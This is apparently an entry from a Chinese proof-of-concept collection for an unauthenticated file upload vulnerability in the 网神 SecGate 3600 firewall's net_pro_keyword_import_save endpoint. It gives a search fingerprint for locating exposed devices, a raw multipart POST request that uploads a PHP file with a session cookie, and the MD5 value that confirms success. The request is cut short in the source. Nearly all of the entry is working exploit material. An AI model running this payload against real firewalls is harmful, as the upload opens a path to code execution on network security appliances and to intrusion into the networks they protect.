# 网神防火墙secgatenet_pro_keyword_import_save文件上传漏洞

- **系统**：网神防火墙secgatenet_pro_keyword_import_save　|　**类型**：文件上传　|　**CVE**：—
- **指纹**：`title="网神SecGate 3600防火墙"`
- **请求**：`GET / HTTP/1.1`

**请求体 / payload**
```
获取cookie
Host:
上传
POST /?q=net_pro_keyword_import_save HTTP/1.1
Host:
Content-Length: 472
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryJpMyThWnAxbcBBQc
Cookie: __s_sessionid__=0j0tih4s6c7880goh18ottlhb3;
------WebKitFormBoundaryJpMyThWnAxbcBBQc
Content-Disposition: form-data; name="reqfile";filename="0j0tih4s6c7880goh18ottlhb3.php"
Content-Type: text/plain
<?php echo(md5(233));unlink(__FILE__);?>
------WebKitFormBoundaryJpMyThWnAxbcBBQc
Content-Disposition: form-data; name="submit_post"
net_pro_keyword_import_save
------WebKitFormBoundaryJpMyThWnAxbcBBQc
Content-Dispositio…（脚本共 802 字，完整版见原文）
```
- **预期**：200　|　访问上传结果
e165421110ba03099a1c0393373c5b43